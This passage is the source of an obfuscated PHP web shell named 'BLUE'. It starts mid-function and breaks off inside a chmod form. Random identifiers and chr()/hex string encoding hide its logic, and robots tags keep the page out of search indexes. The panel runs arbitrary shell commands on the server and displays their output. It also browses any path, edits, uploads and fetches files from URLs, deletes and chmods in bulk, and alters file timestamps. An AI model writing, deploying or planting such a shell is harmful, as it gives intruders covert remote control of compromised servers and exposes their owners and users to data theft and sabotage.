    if (!$_66f6b0)
        return;
    while (false !== ($_5be2f1 = readdir($_66f6b0))) {
        if ($_5be2f1 === "\x2e" || $_5be2f1 === "\x2e\x2e")
            continue;
        $_e10a9b = $_e6f0b6 . DIRECTORY_SEPARATOR . $_5be2f1;
        $_bcc9b1 = $_6f644e . "\x2f" . basename($_5be2f1);
        if (is_dir($_e10a9b)) {
            if (method_exists($_055d20, chr(97).chr(100).chr(100).chr(69).chr(109).chr(112).chr(116).chr(121).chr(68).chr(105).chr(114)))
                $_055d20->addEmptyDir($_bcc9b1);
            _fae6f7bbc($_055d20, $_e10a9b, $_bcc9b1);
        }
        elseif (is_file($_e10a9b) && method_exists($_055d20, chr(97).chr(100).chr(100).chr(70).chr(105).chr(108).chr(101))) {
            $_055d20->addFile($_e10a9b, $_bcc9b1);
        }
    }
    closedir($_66f6b0);
}


$_baeb7e = _f0e7df4b1($_cf79f1);
$_730d86 = array();
$_c856dc = array();
foreach ($_baeb7e as $_6c86ea) {
    $_e10a9b = $_cf79f1 . DIRECTORY_SEPARATOR . $_6c86ea;
    if (is_dir($_e10a9b))
        $_c856dc[] = $_6c86ea;
    else
        $_730d86[] = $_6c86ea;
}
$_23e34d = defined(chr(83).chr(79).chr(82).chr(84).chr(95).chr(78).chr(65).chr(84).chr(85).chr(82).chr(65).chr(76));
$_52f409 = defined("\x53\x4f\x52\x54\x5f\x46\x4c\x41\x47\x5f\x43\x41\x53\x45");
if ($_23e34d) {
    sort($_c856dc, $_52f409 ? (SORT_NATURAL | SORT_FLAG_CASE) : SORT_NATURAL);
    sort($_730d86, $_52f409 ? (SORT_NATURAL | SORT_FLAG_CASE) : SORT_NATURAL);
}
else {
    natcasesort($_c856dc);
    $_c856dc = array_values($_c856dc);
    natcasesort($_730d86);
    $_730d86 = array_values($_730d86);
}

$_ae957d = dirname($_cf79f1);
if ($_ae957d === $_cf79f1)
    $_ae957d = $_cf79f1;

$_782af3 = ((((isset($_GET[chr(97)]) ? $_GET[chr(97)] : "") === "\x65\x64\x69\x74")) && isset($_GET[chr(102)])) ? _f46d3561b($_cf79f1, $_GET[chr(102)]) : null;
$_e67a89 = ($_782af3 && is_file($_782af3)) ? $_782af3 : null;

$_7b1604 = ((((isset($_GET[chr(97)]) ? $_GET[chr(97)] : '') === "\x76\x69\x65\x77")) && isset($_GET[chr(102)])) ? _f46d3561b($_cf79f1, $_GET[chr(102)]) : null;
$_dbf9ce = ($_7b1604 && is_file($_7b1604)) ? $_7b1604 : null;

$_a0ba20 = isset($_GET[chr(109).chr(111).chr(100).chr(101)]) ? $_GET["\x6d\x6f\x64\x65"] : "\x61\x75\x74\x6f";
$_93cb5a = in_array($_a0ba20, array("\x74\x78\x74", chr(98).chr(54).chr(52), chr(97).chr(117).chr(116).chr(111)), true) ? $_a0ba20 : chr(97).chr(117).chr(116).chr(111);

$_fa11b8 = isset($_SESSION["\x63\x73\x72\x66"]) ? $_SESSION["\x63\x73\x72\x66"] : "";
$_01a177 = date(chr(89));
?>
    <!doctype html>
    <html lang="en" class="dark">
    <head>
        <meta charset="utf-8">
        <title>BLUE</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
        <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
        <script src="https://cdn.tailwindcss.com"></script>
        <script>
            tailwind.config = { darkMode:'class', theme:{ extend:{
                        fontFamily:{ ui:['Ubuntu','ui-sans-serif','system-ui','Segoe UI','Roboto','Helvetica Neue','Arial','Noto Sans'] },
                        colors:{ canvas:{DEFAULT:'#0b1220',light:'#0b1220',surface:'rgba(15,23,42,.8)'}, brand:{50:'#eef2ff',500:'#6366f1',600:'#5458ee',700:'#4338ca'} },
                        boxShadow:{ card:'0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03)' , glow:'0 6px 20px rgba(99,102,241,.25)' },
                        borderRadius:{ xl2:'18px' }
                    } } }
        </script>
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
        <link href="https://www.svgrepo.com/show/475654/github-color.svg" rel="icon">

        <!-- CodeMirror 5 -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
        <style>
            .CodeMirror{ border:1px solid rgba(148,163,184,.18); border-radius:12px; height:420px; background:#0b1220; color:#e5e7eb; }
            .cm-s-material-darker .CodeMirror-gutters{ background:#0b1220; border-right:1px solid rgba(148,163,184,.18); }

            html,body{height:100%}
            body{font-family:'Ubuntu',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";}
            .shell{min-height:100vh;background:radial-gradient(1200px 600px at 20% -10%, rgba(99,102,241,.15), transparent 60%), radial-gradient(900px 500px at 90% 0%, rgba(168,85,247,.12), transparent 60%), #0b1220; display:grid; grid-template-rows:auto 1fr auto;}
            .card{background:rgba(15,23,42,.8);border:1px solid rgba(148,163,184,.15);border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);backdrop-filter:blur(8px);}
            .field{border:1px solid rgba(148,163,184,.18);border-radius:12px;padding:.5rem .75rem;width:100%;background:#0b1220;color:#e5e7eb;}
            .field:focus{outline:none;box-shadow:0 0 0 4px rgba(99,102,241,.25);border-color:#6366f1}
            .btn{background:linear-gradient(180deg,#6366f1,#4f46e5);color:#eef2ff;border-radius:10px;padding:.5rem .75rem;font-weight:700;font-size:.875rem;line-height:1.25rem;display:inline-flex;align-items:center;justify-content:center;transition:transform .05s, box-shadow .15s, filter .15s; box-shadow:0 6px 20px rgba(99,102,241,.22);}
            .btn:hover{filter:brightness(1.06);box-shadow:0 10px 26px rgba(99,102,241,.35)} .btn:active{transform:translateY(.5px)}
            .btn-ghost{background:transparent;border:1px solid rgba(148,163,184,.25);color:#e5e7eb;}
            .btn-xs{padding:.25rem .5rem;font-size:.75rem;border-radius:8px}.btn-sm{padding:.35rem .6rem;font-size:.8125rem;border-radius:9px}.btnw{min-width:96px}
            .tbl thead th{position:sticky;top:0;background:#0b1220e6;backdrop-filter:blur(6px);z-index:1;color:#cbd5e1}
            .tbl tbody tr:nth-child(even){background:rgba(148,163,184,.04)}
            .tbl tbody tr.hoverable:hover{background:rgba(99,102,241,.22);box-shadow:inset 0 0 0 9999px rgba(99,102,241,.10)}
            .tbl tbody tr.hoverable{transition:background .15s ease}
            .ico{width:18px;height:18px;display:inline-block;vertical-align:text-bottom;color:#cbd5e1}
            .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
            .badge-small{font-size:11px;padding:.1rem .4rem;border-radius:999px;background:#111827;color:#c7d2fe;border:1px solid #374151}
            .row-actions{display:grid;grid-template-columns:repeat(8, minmax(90px, auto));gap:.35rem;justify-items:start}
            @media (max-width:1200px){ .row-actions{grid-template-columns:repeat(3, minmax(90px, auto));} }
            .tablewrap{height:calc(100vh - 320px);overflow:auto}
            @media (max-height:800px){ .tablewrap{height:calc(100vh - 360px)} }
            .drop-hint{border:2px dashed rgba(99,102,241,.45); background:rgba(99,102,241,.06)}
            .droptarget{outline:2px dashed rgba(99,102,241,.7); outline-offset:-2px}
            /*#tableCard{ min-height: calc(100vh - 260px); }*/

            /* Command editors */
            .cm-cmd-input { font-size:13px; line-height:1.45; }
            .cm-cmd-input .CodeMirror { width:100% !important; }
            .cm-cmd-input .CodeMirror-scroll { height:36px !important; } /* single line */
            .cm-cmd-input .CodeMirror { height:36px !important; }
            .cm-cmd-output { font-size:14px; line-height:1.5; }
            .cm-cmd-output .CodeMirror { width:100% !important; }
            .cm-cmd-output .CodeMirror-scroll { height:380px !important; }

            /* Lebar command dibatasi agar tidak terlalu panjang */
            .cmd-container{ max-width:600px; width:100%; }
            @media (min-width:1536px){ .cmd-container{ max-width:680px; } }

            /* Make table copy-friendly */
            #tableCard, #tableCard * { user-select: text; -webkit-user-select: text; }

            /* Force ALL links inside the directory table to be white */
            #dirTable a, #dirTable a:visited { color:#ffffff !important; }

            /* Footer gradient line */
            .footer-line{height:1px;background:linear-gradient(90deg,rgba(99,102,241,.0),rgba(99,102,241,.5),rgba(99,102,241,.0));}

            /* Placeholder abu untuk CodeMirror command */
            .cm-cmd-input .CodeMirror-empty .CodeMirror-placeholder {
                color:#94a3b8; /* slate-400 */
                opacity:.95;
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/mode/loadmode.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/meta.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/selection/active-line.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/display/placeholder.min.js"></script>
    </head>
    <body class="shell text-slate-100" id="bodyRoot">
    <header class="sticky top-0 z-20 w-full border-b border-slate-800 bg-slate-900/70 backdrop-blur">
        <div class="w-full px-6 py-3 flex items-center justify-between gap-3">
            <div class="flex items-center gap-3 shrink-0">
                <div class="text-2xl"><?php echo _f753d4f74("\x70\x77\x78", chr(105).chr(99).chr(111)); ?></div>
                <div>
                    <div class="text-lg font-semibold tracking-tight" style="background:linear-gradient(90deg,#93c5fd,#c4b5fd);-webkit-background-clip:text;background-clip:text;color:transparent"><a href="?">BLUE</a></div>
                    <div class="text-xs text-slate-400">PHP <?php echo h(PHP_VERSION); ?></div>
                </div>
            </div>

            <div class="hidden md:flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/60 px-2 py-1 shrink-0">
                <?php echo _f753d4f74(chr(115).chr(101).chr(97).chr(114).chr(99).chr(104), chr(105).chr(99).chr(111)); ?>
                <input id="searchBox" type="search" placeholder="Filter by name (Ctrl+/)" class="bg-transparent text-sm outline-none placeholder:text-slate-500 w-64" oninput="filterRows()">
            </div>

            <div class="text-sm text-slate-300 hidden lg:block truncate">
                Path: <span class="mono"><?php echo h($_cf79f1); ?></span>
            </div>

            <!-- Command (dibatasi lebar) -->
            <div class="cmd-container ml-auto">
                <form method="post" action="?a=cmd&p=<?php echo rawurlencode($_cf79f1); ?>" class="hidden md:flex items-center gap-2 w-full" id="cmdForm">
                    <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                    <textarea id="cmdTA" name="cmd" class="field mono w-full" placeholder="Run Command" rows="1"></textarea>
                    <button class="btn btn-sm shrink-0" type="submit">Run</button>
                </form>
            </div>

            <form method="post" action="?a=logout&p=<?php echo rawurlencode($_cf79f1); ?>" class="ml-1 shrink-0">
                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                <button class="btn btn-sm" type="submit">Logout</button>
            </form>
        </div>
    </header>

    <main class="w-full px-6 py-4 grid grid-cols-12 gap-4">

        <?php if (!empty($_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)])):
    $_773fad = $_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)];
    unset($_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)]); ?>
            <section class="col-span-12">
                <div class="card p-4 mb-4">
                    <details open>
                        <summary class="cursor-pointer font-medium">
                            Command Output × <span class="mono"><?php echo h($_773fad[chr(99).chr(109).chr(100)]); ?></span>
                            <span class="ml-2 text-xs text-slate-400">via <?php echo h($_773fad[chr(109).chr(101).chr(116).chr(104).chr(111).chr(100)]); ?>, exit <?php echo h((string)$_773fad["\x63\x6f\x64\x65"]); ?></span>
                        </summary>
                        <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php echo h($_773fad[chr(111).chr(117).chr(116)]); ?></pre>
                    </details>
                </div>
            </section>
        <?php
endif; ?>

        <!-- SIDEBAR -->
        <aside class="col-span-12 xl:col-span-3 space-y-4">
            <?php if (!empty($_SESSION["\x6d\x73\x67"])): ?>
                <div class="rounded-xl border border-blue-900/60 bg-blue-900/20 text-blue-100 px-4 py-3">
                    <?php echo h($_SESSION[chr(109).chr(115).chr(103)]);
    unset($_SESSION[chr(109).chr(115).chr(103)]); ?>
                </div>
            <?php
endif; ?>

            <section class="card p-4">
                <h2 class="font-medium mb-3">Navigation</h2>
                <div class="mb-2 text-sm text-slate-300">Breadcrumbs</div>
                <div class="flex flex-wrap gap-1 text-sm">
                    <?php foreach (_faa002151($_cf79f1) as $_880dfd => $_8d0867):
    list($_aa96df, $_1db743) = $_8d0867; ?>
                        <?php if ($_880dfd)
        echo chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(116).chr(101).chr(120).chr(116).chr(45).chr(115).chr(108).chr(97).chr(116).chr(101).chr(45).chr(54).chr(48).chr(48).chr(34).chr(62).chr(47).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?>
                        <a href="?p=<?php echo rawurlencode($_1db743); ?>" class="inline-flex items-center gap-1 px-2 py-1 rounded-md border border-slate-700 bg-slate-800 text-slate-200 hover:border-slate-500 hover:bg-slate-700 transition"><?php echo h($_aa96df); ?></a>
                    <?php
endforeach; ?>
                </div>
                <hr class="my-4 border-slate-700">
                <form method="get" class="space-y-2">
                    <label class="text-sm text-slate-300">Change Path</label>
                    <input type="text" name="p" class="field mono" placeholder="/home/user" value="<?php echo h($_cf79f1); ?>">
                    <div class="flex gap-2">
                        <button class="btn btnw" type="submit">Go</button>
                        <a class="btn btnw" href="?">Go to CWD</a>
                    </div>
                </form>
            </section>

            <!-- CREATE: New File / New Folder -->
            <section class="card p-4">
                <h2 class="font-medium mb-3">Create</h2>

                <form method="post" action="?a=new-file&p=<?php echo rawurlencode($_cf79f1); ?>" class="space-y-2">
                    <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                    <label class="text-sm text-slate-300">New File</label>
                    <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
                    <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
                    <button class="btn w-full" type="submit">Create File</button>
                    <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
                </form>

                <hr class="my-3 border-slate-700">

                <form method="post" action="?a=new-dir&p=<?php echo rawurlencode($_cf79f1); ?>" class="space-y-2">
                    <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                    <label class="text-sm text-slate-300">New Folder</label>
                    <input type="text" name="name" class="field mono" placeholder="NewFolder" required>
                    <button class="btn w-full" type="submit">Create Folder</button>
                </form>
            </section>

            <section class="card p-4">
                <h2 class="font-medium mb-3">Upload</h2>
                <div class="grid grid-cols-1 gap-4">
                    <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo rawurlencode($_cf79f1); ?>" class="space-y-2">
                        <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                        <input type="file" name="files[]" multiple class="block text-sm file:mr-3 file:rounded-md file:border file:border-slate-700 file:px-3 file:py-1.5 file:bg-slate-800 file:text-slate-200">
                        <button class="btn w-full" type="submit">Upload Files</button>
                        <div class="text-xs text-slate-400">Fallback order: move × rename × copy × get+put × stream copy.</div>
                    </form>
                    <form method="post" action="?a=url-upload&p=<?php echo rawurlencode($_cf79f1); ?>" class="space-y-2">
                        <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                        <input type="url" name="url" class="field" placeholder="https://example.com/file.txt" required>
                        <input type="text" name="filename" class="field" placeholder="File name (optional)">
                        <button class="btn w-full" type="submit">Fetch from URL</button>
                        <div class="text-xs text-slate-400">Methods: cURL × copy(stream) × get+put × stream copy.</div>
                    </form>
                    <div class="text-xs text-slate-400">
                        Tip: You can also drag &amp; drop files anywhere on this page to upload.
                    </div>
                </div>
            </section>
        </aside>

        <!-- MAIN: Editor / Preview panels + Table -->
        <section class="col-span-12 xl:col-span-9 flex flex-col gap-4">

            <?php if ($_e67a89): ?>
                <?php
    $_f3c688 = ($_93cb5a === chr(97).chr(117).chr(116).chr(111));
    if ($_f3c688) {
        $_93cb5a = _fce7b8327($_e67a89) ? chr(116).chr(120).chr(116) : chr(98).chr(54).chr(52);
    }
    $_0cc1c9 = @file_get_contents($_e67a89);
    if ($_0cc1c9 === false) {
        $_0cc1c9 = '';
    }
    $_14acd3 = ($_93cb5a === "\x62\x36\x34") ? base64_encode($_0cc1c9) : $_0cc1c9; ?>
                <div class="card p-4" id="editPanelWrap">
                    <details id="editPanel" open>
                        <summary class="cursor-pointer font-medium flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <span>Edit File</span>
                                <span class="text-xs text-slate-400">Size: <?php echo h(_f172932e7((int)@filesize($_e67a89))); ?></span>
                            </div>
                            <div class="flex items-center gap-2">
                                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
                            </div>
                        </summary>

                        <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php echo h($_e67a89); ?></div>

                        <div class="mt-2">
                            <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $_93cb5a === chr(116).chr(120).chr(116) ? chr(98).chr(103).chr(45).chr(105).chr(110).chr(100).chr(105).chr(103).chr(111).chr(45).chr(54).chr(48).chr(48).chr(32).chr(116).chr(101).chr(120).chr(116).chr(45).chr(119).chr(104).chr(105).chr(116).chr(101).chr(32).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(45).chr(105).chr(110).chr(100).chr(105).chr(103).chr(111).chr(45).chr(54).chr(48).chr(48) : chr(98).chr(103).chr(45).chr(115).chr(108).chr(97).chr(116).chr(101).chr(45).chr(56).chr(48).chr(48); ?>" href="?a=edit&f=<?php echo rawurlencode(basename($_e67a89)); ?>&p=<?php echo rawurlencode($_cf79f1); ?>&mode=txt">Text</a>
                            <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $_93cb5a === "\x62\x36\x34" ? "\x62\x67\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x62\x6f\x72\x64\x65\x72\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30" : "\x62\x67\x2d\x73\x6c\x61\x74\x65\x2d\x38\x30\x30"; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($_e67a89)); ?>&p=<?php echo rawurlencode($_cf79f1); ?>&mode=b64">Base64</a>
                        </div>

                        <form method="post" accept-charset="UTF-8" action="?a=edit-save&p=<?php echo rawurlencode($_cf79f1); ?>" class="mt-3" id="editForm">
                            <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                            <input type="hidden" name="file" value="<?php echo h(basename($_e67a89)); ?>">
                            <input type="hidden" name="mode" value="<?php echo h($_93cb5a); ?>">

                            <?php if ($_93cb5a === "\x74\x78\x74"): ?>
                                <textarea id="editor" name="content"><?php echo h($_14acd3); ?></textarea>
                            <?php
    else: ?>
                                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php echo h($_14acd3); ?></textarea>
                                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
                            <?php
    endif; ?>

                            <div class="mt-3 flex flex-wrap gap-2 items-center">
                                <button class="btn btnw" type="submit">Save</button>
                                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
                                <a class="btn btnw" href="?p=<?php echo rawurlencode($_cf79f1); ?>">Exit & Reset</a>
                                <?php if ($_93cb5a === "\x74\x78\x74"): ?>
                                    <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
                                <?php
    endif; ?>
                            </div>
                        </form>
                    </details>
                </div>
            <?php
endif; ?>

            <?php if ($_dbf9ce): ?>
                <?php
    $_4f2ebe = (int)@filesize($_dbf9ce);
    $_ce638f = strtolower(pathinfo($_dbf9ce, PATHINFO_EXTENSION));
    $_acf8a9 = in_array($_ce638f, array(chr(106).chr(112).chr(103), "\x6a\x70\x65\x67", chr(112).chr(110).chr(103), "\x67\x69\x66", "\x77\x65\x62\x70", "\x62\x6d\x70", chr(115).chr(118).chr(103)));
    $_c6c694 = _fce7b8327($_dbf9ce);
    $_03aa4a = 512 * 1024; 
    $_fdea76 = "";
    if ($_c6c694) {
        $_fdea76 = @file_get_contents($_dbf9ce, false, null, 0, $_03aa4a);
        if ($_fdea76 === false)
            $_fdea76 = "";
    }
?>
                <div class="card p-4" id="previewWrap">
                    <details id="previewPanel" open>
                        <summary class="cursor-pointer font-medium flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <span>Preview: <span class="mono"><?php echo h(basename($_dbf9ce)); ?></span></span>
                                <span class="text-xs text-slate-400">Size: <?php echo h(_f172932e7($_4f2ebe)); ?></span>
                            </div>
                            <div class="flex items-center gap-2">
                                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
                            </div>
                        </summary>

                        <div class="mt-3 text-xs text-slate-400 mono"><?php echo h($_dbf9ce); ?></div>

                        <div class="mt-3">
                            <?php if ($_acf8a9): ?>
                                <img src="?a=raw&f=<?php echo rawurlencode(basename($_dbf9ce)); ?>&p=<?php echo rawurlencode($_cf79f1); ?>" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
                            <?php
    elseif ($_c6c694): ?>
                                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php echo h($_fdea76); ?></pre>
                                <?php if ($_4f2ebe > $_03aa4a): ?>
                                    <div class="mt-2 text-xs text-slate-400">Showing <?php echo h(_f172932e7($_03aa4a)); ?> of <?php echo h(_f172932e7($_4f2ebe)); ?>. Use Edit/Download for full content.</div>
                                <?php
        endif; ?>
                            <?php
    else: ?>
                                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
                                    <div class="text-sm">This file type cannot be previewed directly.</div>
                                    <div class="mt-2 flex gap-2">
                                        <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($_dbf9ce)); ?>&p=<?php echo rawurlencode($_cf79f1); ?>">Download</a>
                                        <a class="btn btn-sm btnw" href="?a=edit&f=<?php echo rawurlencode(basename($_dbf9ce)); ?>&p=<?php echo rawurlencode($_cf79f1); ?>">Edit (careful if binary)</a>
                                    </div>
                                </div>
                            <?php
    endif; ?>
                        </div>
                    </details>
                </div>
            <?php
endif; ?>

            <div class="card p-4 flex flex-col" id="tableCard">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="font-medium">Directory Contents</h2>
                    <div class="text-sm text-slate-400">Dirs: <?php echo count($_c856dc); ?> × Files: <?php echo count($_730d86); ?></div>
                </div>
                <div class="flex-1 flex flex-col">
                    <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($_cf79f1); ?>" id="bulkDeleteForm">
                        <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                    </form>
                    <div class="mb-3 flex flex-wrap gap-2">
                        <button form="bulkDeleteForm" class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>

                        <form method="post" action="?a=mass-chmod&p=<?php echo rawurlencode($_cf79f1); ?>" class="inline-flex flex-wrap items-center gap-2" onsubmit="return prepBulkChmod(this)">
                            <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                            <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                            <label class="text-xs flex items-center gap-1 text-slate-300"><input type="checkbox" name="recursive"> rec</label>
                            <button class="btn btn-sm btnw" type="submit">Chmod Selected</button>
                        </form>

                        <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
                        <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>

                        <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
                            <span>Sort:</span>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
                        </div>

                        <!-- Toggle drag-to-move (default OFF) -->
                        <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
                            <input id="dragToggle" type="checkbox" class="accent-indigo-500">
                            Enable drag-to-move
                        </label>
                    </div>

                    <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
                        <table id="dirTable" class="tbl min-w-full text-sm">
                            <thead class="text-left border-b border-slate-700">
                            <tr>
                                <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                                <th class="py-2 px-2">Name</th>
                                <th class="py-2 px-2">Size</th>
                                <th class="py-2 px-2">Perms</th>
                                <th class="py-2 px-2">Owner</th>
                                <th class="py-2 px-2">Modified</th>
                                <th class="py-2 px-2">Actions</th>
                            </tr>
                            </thead>
                            <tbody id="dirBody">
                            <?php foreach ($_c856dc as $_aa96df):
    $_e10a9b = $_cf79f1 . DIRECTORY_SEPARATOR . $_aa96df;
    $_b0d457 = @is_readable($_e10a9b);
    $_29a9ce = @is_writable($_e10a9b);
    $_f72f4e = $_29a9ce ? "\x74\x65\x78\x74\x2d\x6c\x69\x6d\x65\x2d\x34\x30\x30" : ($_b0d457 ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(119).chr(104).chr(105).chr(116).chr(101) : "\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30");
?>
                                <tr class="border-b border-slate-800 hoverable"
                                    data-type="dir"
                                    data-name="<?php echo h(strtolower($_aa96df)); ?>"
                                    data-size="0"
                                    data-mtime="<?php echo (int)@filemtime($_e10a9b); ?>"
                                    draggable="true"
                                    ondragstart="onDragStartItem(event, <?php echo je($_aa96df); ?>)"
                                    ondragover="onDragOverDir(event)"
                                    ondragleave="onDragLeaveDir(event)"
                                    ondrop="onDropToDir(event, <?php echo je($_aa96df); ?>)">
                                    <td class="py-2 px-2"><input form="bulkDeleteForm" class="rowchk" type="checkbox" name="items[]" value="<?php echo h($_aa96df); ?>"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 <?php echo $_f72f4e; ?>">
                                            <?php echo _f6879b162($_e10a9b); ?>
                                            <a class="hover:underline font-medium text-white"
                                               draggable="false"
                                               onclick="return guardLinkCopy(event)"
                                               href="?p=<?php echo rawurlencode($_e10a9b); ?>"><?php echo h($_aa96df); ?></a>
                                            <span class="badge-small">DIR</span>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2">-</td>
                                    <td class="py-2 px-2 mono <?php echo $_f72f4e; ?>"><?php echo h(_fcc5d0122($_e10a9b)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(_fa695a864($_e10a9b)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), @filemtime($_e10a9b) ?: time())); ?></td>
                                    <td class="py-2 px-2">
                                        <div class="row-actions">
                                            <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                                            <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>

                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($_aa96df); ?>')">Rename</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($_aa96df); ?>')">Chmod</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($_aa96df); ?>')">Change Date</button>

                                            <form method="post" action="?a=delete&p=<?php echo rawurlencode($_cf79f1); ?>" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_aa96df); ?>">
                                                <button class="btn btn-xs btnw" type="submit">Delete</button>
                                            </form>
                                        </div>

                                        <div id="rn-<?php echo h($_aa96df); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=rename&p=<?php echo rawurlencode($_cf79f1); ?>" class="flex flex-wrap gap-2">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
                                                <input type="hidden" name="old" value="<?php echo h($_aa96df); ?>">
                                                <input type="text" name="new" class="field w-48" placeholder="New name" value="<?php echo h($_aa96df); ?>">
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="cm-<?php echo h($_aa96df); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=chmod&p=<?php echo rawurlencode($_cf79f1); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_fa11b8); ?>">
